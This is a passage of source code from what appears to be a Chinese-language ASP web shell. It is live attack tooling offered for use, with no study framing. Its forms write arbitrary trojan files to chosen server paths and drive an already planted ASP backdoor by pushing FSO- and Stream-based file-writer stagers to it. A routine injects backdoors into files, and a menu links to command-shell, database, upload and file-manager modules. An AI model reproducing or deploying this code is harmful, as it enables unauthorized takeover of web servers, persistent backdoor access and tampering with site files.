    alert("转换的10进制为:"&base&chr(10)&chr(13)&"转换的16进制为:"&cc)
	exit sub
  end if 
  aa=asc(cstr(base))
  bb=hex(aa)
  alert("转换的10进制为:"&aa&chr(10)&chr(13)&"转换的16进制为:"&bb)
end sub
sub main2()
  If document.all.vars.value<>"" Then
	Dim nums,tmp,tmpstr,i
	nums=document.all.vars.value
	nums_len=Len(nums)
	For i=1 To nums_len
      tmp=Mid(nums,i,1)
	  If IsNumeric(tmp) Then
        tmp=tmp * 16 * (16^(nums_len-i-1))
	  Else
	   	If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then 
       	  alert("你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。")
	      exit sub
		End If
    	tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))
	  End If
      tmpstr=tmpstr+tmp
	Next
	alert("转换的10进制为:"&tmpstr&chr(10)&chr(13)&"转换的字符值为:"&chr(tmpstr))
  End If
end sub
</script>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
<%
dim objFSO,fdata,objCountFile 
on error resume next 
Set objFSO = Server.CreateObject("Scripting.FileSystemObject") 
if Trim(request("syfdpath"))<>"" then 
  fdata = request("cyfddata") 
  Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True) 
  objCountFile.Write fdata 
  if err =0 then 
    echo("<script language=""javascript"">alert('保存成功!');</script>")
  else 
    echo("<script language=""javascript"">alert('保存失败!');</script>")
  end if 
  err.clear 
end if 
objCountFile.Close 
Set objCountFile=Nothing 
Set objFSO = Nothing 
%>
  <form action='' method="post">
  <tr> 
    <td height="22" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】直接写入木马</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="18" align="center" class="td">&nbsp;保存文件的绝对路径&nbsp;<input name="syfdpath" type="text" size="60"><br>
	  (包括文件名,如当前文件路径为:"<% =server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>")
    </td>
    </tr>
  <tr> 
    <td align="center" class="td"><textarea name="cyfddata" cols="80" rows="10">输入马的内容</textarea>
  </tr>
  <tr> 
    <td align="center" class="td"> 
      <input type=submit value="保 存">
      <input type="reset" name="Submit32" value="重 置">
    </td>
  </tr>
  </form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
  <form method="post" target="_blank">
    <tr> 
      <td height="22" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】插入ASP后门客户端</td>
    </tr>
	<tr> 
      <td class="trHead">&nbsp;</td>
    </tr>
	<tr> 
      <td height="18" align="center" class="td">&nbsp;已插入后门地址: 
        <input name="theAction" type="text" id="theAction" value="http://" size="50">        
        <input name="Submit422" type="button" class="inputLogin" onClick="this.form.sharp.rows+=6;" value="+"> 
        <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.sharp.rows&gt;10){this.form.sharp.rows-=6;}" value="-"> 
      </td>
    </tr>
    <tr> 
      <td height="18" align="center" class="td">&nbsp;服务器端变量名称:
	    <input name="password" type="password" id="password" size="9" value="<%=clientPassword%>">&nbsp;生成文件名:
        <input name="shellname" type="text" id="shellname" size="20" value="upfile.asp">
		<input name="Submit422" type="button" class="inputLogin" onClick="this.form.sharp.value='fsoSaveToFile Server.MapPath(&quot;.&quot;)&&quot;\\&quot;&request(&quot;shellname&quot;), Request(&quot;fileContent&quot;)\n\nSub fsoSaveToFile(thePath, fileContent)\n  Dim fso,theFile\n  Set fso = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)\n  Set theFile = fso.OpenTextFile(thePath, 2, true)\n  theFile.Write fileContent\n  theFile.Close\n  response.redirect request(&quot;shellname&quot;)\n  Set fso = Nothing\n  Set theFile = Nothing\nEnd Sub';" value="Fso生成">
		<input name="Submit422" type="button" class="inputLogin" onClick="this.form.sharp.value='set stream=server.createObject(&quot;Adodb.Stream&quot;)\nstream.Open\nstream.Type=2\nstream.CharSet=&quot;gb2312&quot;\nstream.writetext request(&quot;fileContent&quot;)\nstream.SaveToFile server.mappath(request(&quot;shellname&quot;)),2\nstream.Close\nset stream=nothing\nresponse.redirect request(&quot;shellname&quot;)';" value="Stream生成">
      </td>
    </tr>
    <tr> 
      <td align="center" class="td"><textarea name="<%=clientPassword%>" id="sharp" cols="80" rows="8">选择生成方式</textarea></td>
    </tr> 
    <tr>
	  <td align="center" class="td"><textarea name="fileContent" cols="80" rows="10" id="fileContent">这里填写马的内容</textarea></td>
    </tr>
    <tr> 
      <td align="center" class="td"> 
        <input type="submit" name="Submit3" value="提 交" onClick="this.form.sharp.name=this.form.password.value;this.form.action=this.form.theAction.value;"> 
        <input type="reset" name="Submit32" value="重 置">
      </td>
    </tr>
  </form>
</table>
<br>
<table width="760" border="0" align="center" cellpadding="0" cellspacing="0">
<form>
  <tr> 
    <td height="22" class="td">&nbsp;【<%=request.serverVariables("server_name")%>】网页代码常用加解密</td>
  </tr>
  <tr> 
    <td class="trHead">&nbsp;</td>
  </tr>
  <tr> 
    <td height="250" align="center" class="td"> 
      <textarea cols=80 name=Word onChange=SetWords(this) rows=6></textarea><br>
      <input name=encode onClick=SetNewWords1(this.form) type=button value="Escape加密"> 
      <input name=uncode onclick=SetNewWords(this.form) type=button value="Escape解密"> 
      <input type="button" name="Submit2" value="Encode加密" onclick="this.form.NewWords.value=screncode(this.form.Word.value,'JS')"> 
      <input type="button" name="Submit2" value="Encode解密" onclick="this.form.NewWords.value=strdec(this.form.Word.value)"><br>
      <textarea cols=80 name=NewWords rows=6></textarea> 
    </td>
  </tr>
  </form>
</table>
<%
  showExecuteTime()
end sub
rem ===================
rem    页面配置模块
rem ===================
sub pageOther()
%>
<style>
BODY{FONT-SIZE: 9pt;COLOR: #000000;FONT-FAMILY: "Courier New";scrollbar-face-color:#E4E4F3;scrollbar-highlight-color:#FFFFFF;	scrollbar-3dlight-color:#E4E4F3;scrollbar-darkshadow-color:#9C9CD3;scrollbar-shadow-color:#E4E4F3;scrollbar-arrow-color:#4444B3;	scrollbar-track-color:#EFEFEF;}
TABLE{FONT-SIZE: 9pt;FONT-FAMILY: "Courier New";BORDER-COLLAPSE: collapse;border-top-width: 1px;border-right-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-top-style: solid;border-right-style: none;border-bottom-style: none;border-left-style: solid;border-top-color: #d8d8f0;border-right-color: #d8d8f0;border-bottom-color: #d8d8f0;border-left-color: d8d8f0;}
.tr{font-family: "Courier New";font-size: 9pt;background-color: #e4e4f3;text-align: center;}
.td{font-family: "Courier New";font-size: 9pt;background-color: #f9f9fd;}
.warningColor {font-family: "Courier New";font-size: 9pt;color: #ff0000;}
input{font-family: "Courier New";BORDER-TOP-WIDTH: 1px;BORDER-LEFT-WIDTH: 1px;FONT-SIZE: 12px;BORDER-BOTTOM-WIDTH: 1px;	BORDER-RIGHT-WIDTH: 1px;color: #000000;}
textarea{font-family: "Courier New";BORDER-TOP-WIDTH: 1px;BORDER-LEFT-WIDTH: 1px;FONT-SIZE: 12px;BORDER-BOTTOM-WIDTH: 1px;	BORDER-RIGHT-WIDTH: 1px;color: #000000;}
A{font-size: 9pt; color: #000000; TEXT-DECORATION: none;font-family: "Courier New"}
A:visited{color: #8484FF;TEXT-DECORATION: none}
A:active{TEXT-DECORATION: none}
A:hover{color: #ff0000; text-decoration: underline;}
tr{font-family: "Courier New";font-size: 9pt;line-height: 18px;}
td{font-family: "Courier New";font-size: 9pt;border-top-width: 1px;border-right-width: 1px;border-bottom-width: 1px;	border-left-width: 1px;border-top-style: none;border-right-style: solid;border-bottom-style: solid;border-left-style: none;	border-top-color: #d8d8f0;border-right-color: #d8d8f0;border-bottom-color: #d8d8f0;border-left-color: #d8d8f0;}
.trHead {font-family: "Courier New";font-size: 9pt;background-color: #e4e4f3;line-height: 3px;}
.inputLogin {font-family: "Courier New";font-size: 9pt;border: 1px solid #d8d8f0;background-color: #f9f9fd;vertical-align: bottom;}
.font-list {font-size: 9pt;color: CCCCFF;font-family: "Courier New";}
</style>
<script lanuage="javascript">
//页面上一些要用到的JS,Marcos编写.
function default_canLogin(frm){
	if(frm.password.value==""){
		alert("请先输入密码!");
		return false;
	}else{
		frm.Submit.disabled=true;
		return true;
	}
}
function stream_editIt(thePath){
	loaded.style.display="block";
	fileEditor.location.href="?pageName=stream&thePath="+thePath+"&theAct=edit";
}
function stream_downIt(thePath){
	loaded.style.display="none";
	if(confirm("如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先用FSO把文件复制到网站目录下,\n然后通过http协议来下载.\n按\"确定\"用流来进行下载.")){
		fileEditor.location.href="?pageName=stream&thePath="+thePath+"&theAct=down";
	}
}
function stream_saveAs(frm,thePath){
	if(frm.thePath.value=prompt('请输入要保存的文件的绝对路径!',thePath)){
		if(frm.thePath.value==null||frm.thePath.value==''){
			return false;
		}else{
			frm.submit();
		}
	}
}
function stream_saveAsTwo(thePath, thePath2){
	var url;
	if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=stream&theAct=saveAsTwo&thePath="+thePath2+"&toPath="+url;
		}
	}
}
function fso_editIt(thePath){
	loaded.style.display="block";
	fileEditor.location.href="?pageName=fso&thePath="+thePath+"&theAct=edit";
}
function fso_saveAs(thePath, thePath2){
	var url;
	if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=fso&theAct=saveAs&thePath="+thePath2+"&toPath="+url;
		}
	}
}
function fso_delFile(thePath, thePath2){
	if(confirm("确认要删除这个文件吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=delFile&thePath="+thePath2;
	}
}
function fso_inject(thePath, thePath2){
	if(confirm("确认要插入后门吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=inject&thePath="+thePath2;
	}
}
function fso_delFolder(thePath, thePath2){
	if(confirm("确认要删除这个目录吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=delFolder&thePath="+thePath2;
	}
}
function upload_canSubmit(frm){
	if(frm.fileName.value==''){
		alert('请填写上传后的文件名!');
		return false;
	}else{
		if(frm.file.value==''){
			alert('请选择要上传的文件!');
			return false;
		}else{
			frm.action+='&fileName='+frm.fileName.value;
			frm.Submit.disabled=true;
			return true;
		}
	}
}
function showMenu(){
	if(top.location==location.href){
		menu.style.display="";
	}
}

//以下代码抄袭,不过忘记是从哪里抄的了,做过一点修改
var Words;
function SetWords(word){
	Words=word.value;
}
function SetNewWords(form){
	var NewWords;
	NewWords=unescape(Words);
	form.NewWords.value=NewWords;
}
function SetNewWords1(form){
	var NewWords;
	NewWords=escape(Words);
	form.NewWords.value=NewWords;
}
	function screncode(s,l){
	enc=new ActiveXObject("Scripting.Encoder");
	return enc.EncodeScriptFile("."+l,s,0,l+"cript");
}
var STATE_COPY_INPUT=100
var STATE_READLEN=101
var STATE_DECODE=102
var STATE_UNESCAPE=103
var pick_encoding=new Array(
	1,2,0,1,2,0,2,0,0,2,0,2,1,0,2,0,
	1,0,2,0,1,1,2,0,0,2,1,0,2,0,0,2,
	1,1,0,2,0,2,0,1,0,1,1,2,0,1,0,2,
	1,0,2,0,1,1,2,0,0,1,1,2,0,1,0,2
	)
var rawData=new Array(
	0x64,0x37,0x69,0x50,0x7E,0x2C,0x22,0x5A,0x65,0x4A,0x45,0x72,
	0x61,0x3A,0x5B,0x5E,0x79,0x66,0x5D,0x59,0x75,0x5B,0x27,0x4C,
	0x42,0x76,0x45,0x60,0x63,0x76,0x23,0x62,0x2A,0x65,0x4D,0x43,
	0x5F,0x51,0x33,0x7E,0x53,0x42,0x4F,0x52,0x20,0x52,0x20,0x63,
	0x7A,0x26,0x4A,0x21,0x54,0x5A,0x46,0x71,0x38,0x20,0x2B,0x79,
	0x26,0x66,0x32,0x63,0x2A,0x57,0x2A,0x58,0x6C,0x76,0x7F,0x2B,
	0x47,0x7B,0x46,0x25,0x30,0x52,0x2C,0x31,0x4F,0x29,0x6C,0x3D,
	0x69,0x49,0x70,0x3F,0x3F,0x3F,0x27,0x78,0x7B,0x3F,0x3F,0x3F,
	0x67,0x5F,0x51,0x3F,0x3F,0x3F,0x62,0x29,0x7A,0x41,0x24,0x7E,
	0x5A,0x2F,0x3B,0x66,0x39,0x47,0x32,0x33,0x41,0x73,0x6F,0x77,
	0x4D,0x21,0x56,0x43,0x75,0x5F,0x71,0x28,0x26,0x39,0x42,0x78,
	0x7C,0x46,0x6E,0x53,0x4A,0x64,0x48,0x5C,0x74,0x31,0x48,0x67,
	0x72,0x36,0x7D,0x6E,0x4B,0x68,0x70,0x7D,0x35,0x49,0x5D,0x22,
	0x3F,0x6A,0x55,0x4B,0x50,0x3A,0x6A,0x69,0x60,0x2E,0x23,0x6A,
	0x7F,0x09,0x71,0x28,0x70,0x6F,0x35,0x65,0x49,0x7D,0x74,0x5C,
	0x24,0x2C,0x5D,0x2D,0x77,0x27,0x54,0x44,0x59,0x37,0x3F,0x25,
	0x7B,0x6D,0x7C,0x3D,0x7C,0x23,0x6C,0x43,0x6D,0x34,0x38,0x28,
	0x6D,0x5E,0x31,0x4E,0x5B,0x39,0x2B,0x6E,0x7F,0x30,0x57,0x36,
	0x6F,0x4C,0x54,0x74,0x34,0x34,0x6B,0x72,0x62,0x4C,0x25,0x4E,
	0x33,0x56,0x30,0x56,0x73,0x5E,0x3A,0x68,0x73,0x78,0x55,0x09,
	0x57,0x47,0x4B,0x77,0x32,0x61,0x3B,0x35,0x24,0x44,0x2E,0x4D,
	0x2F,0x64,0x6B,0x59,0x4F,0x44,0x45,0x3B,0x21,0x5C,0x2D,0x37,
	0x68,0x41,0x53,0x36,0x61,0x58,0x58,0x7A,0x48,0x79,0x22,0x2E,
	0x09,0x60,0x50,0x75,0x6B,0x2D,0x38,0x4E,0x29,0x55,0x3D,0x3F
)
var transformed=new Array()
for (var i=0; i<3; i++) transformed[i]=new Array()
for (var i=31; i<=126; i++) for (var j=0; j<3; j++) transformed[j][rawData[(i-31) * 3+j]]=(i==31)?9:i
	var digits=new Array()
for (var i=0; i<26; i++){
	digits["A".charCodeAt(0)+i]=i
	digits["a".charCodeAt(0)+i]=i+26
}
for (var i=0; i<10; i++) digits["0".charCodeAt(0)+i]=i+52
digits[0x2b]=62
digits[0x2f]=63

function unescape2(char){
	var escapes="#&!*$"
	var escaped="\r\n<>@"
		if (char.charCodeAt(0) > 126) return char
	if (escapes.indexOf(char)!=-1) return escaped.substr(escapes.indexOf(char),1)
	return "?"
}
function decodeBase64(string){
	var val=0
	val+=(digits[string.substr(0,1).charCodeAt(0)]<<2)
	val+=(digits[string.substr(1,1).charCodeAt(0)]>>4)
	val+=(digits[string.substr(1,1).charCodeAt(0)]&0xf)<<12
	val+=((digits[string.substr(2,1).charCodeAt(0)]>>2)<<8)
	val+=((digits[string.substr(2,1).charCodeAt(0)]&0x3)<<22)
	val+=(digits[string.substr(3,1).charCodeAt(0)]<<16)
	return val
}
function strdec(encodingString){
	var marker="#@~^"
	var stringIndex=0
	var scriptIndex=-1
	var unEncodingIndex=0
	var char=null
	var encodingLength=unEncodinglength=0
	var state=STATE_COPY_INPUT
	var unEncodingString=""
	var re,arr
		while(state){
		switch (state){
			case (STATE_COPY_INPUT):
				scriptIndex=encodingString.indexOf(marker,stringIndex)
				if (scriptIndex!=-1){
					unEncodingString+=encodingString.substring(stringIndex,scriptIndex)
					scriptIndex+=marker.length
					state=STATE_READLEN
				}else{
					stringIndex=stringIndex==0?0:stringIndex
					unEncodingString+=encodingString.substr(stringIndex,encodingString.length)
					state=0
				}
			break
		case (STATE_READLEN):
			encodingLength=encodingString.substr(scriptIndex,6)
			unEncodinglength=decodeBase64(encodingLength)
			scriptIndex+=(6+"==".length)
			state=STATE_DECODE
			break
		case (STATE_DECODE):
			if (!unEncodinglength){
				stringIndex=scriptIndex+"DQgAAA==^#~@".length
				unEncodingIndex=0
				state=STATE_COPY_INPUT
				break
			}
			char=encodingString.substr(scriptIndex,1)
			if (char=="@") state=STATE_UNESCAPE
			else{
				if (char.charCodeAt(0)<0xFF){
					unEncodingString+=String.fromCharCode(transformed[pick_encoding[unEncodingIndex%64]][char.charCodeAt(0)])
					unEncodingIndex++
				}else{
					unEncodingString+=char
				} 
				scriptIndex++
				unEncodinglength--
				break
			}
		case STATE_UNESCAPE:
			unEncodingString+=unescape2(encodingString.substr(++scriptIndex,1))
			scriptIndex++; unEncodinglength -=2
			unEncodingIndex++
			state=STATE_DECODE
			break
		}
	}
		re=new RegExp("(JScript|VBscript).encode","gmi")
	while(arr=re.exec(unEncodingString)) unEncodingString=RegExp.leftContext+RegExp.$1+RegExp.rightContext
	return unEncodingString
}
</script>
<%
end sub
rem ===================
rem    模块调用模块
rem ===================
sub showMenu()
  if pageName="" or pageName="default" then exit sub
  echo("<div style=""display:none;"" id=""menu"" align=""center"">")
  echo("<a href=""?pageName=server"">〖Server〗</a><a href=""?pageName=stream"">〖Stream〗</a>")
  echo("<a href=""?pageName=fso"">〖FSO〗</a><a href=""?pageName=cmdShell"">〖Shell〗</a>")
  echo("<a href=""?pageName=app"">〖App〗</a>")
  echo("<a href=""?pageName=sql"">〖DB〗</a><a href=""?pageName=upload"">〖Other〗</a>")
  echo("<a href=""?pageName=logout"">〖Logout〗</a>")
  echo("<br><br></div>")
  echo("<script language=""JavaScript"">showMenu();</script>")
end sub
rem -------------------
rem    页面生成模块
rem -------------------
if pageName<>"stream" then
	pageOther()
	showMenu()
end if
select case pageName
	case "","default"
		pageDefault()
	case "server"
		pageServer()
	case "stream"
		pageStream()
	case "sql"
		pageSql()
	case "fso"
		pageFso()
	case "upload"
		pageUpload()
	case "cmdShell"
		pageCmdShell()
	case "app"
		pageApp()
	case "logout":Session.Contents.Remove(m&"userPassword"):redirectTo("/")
end select
%>
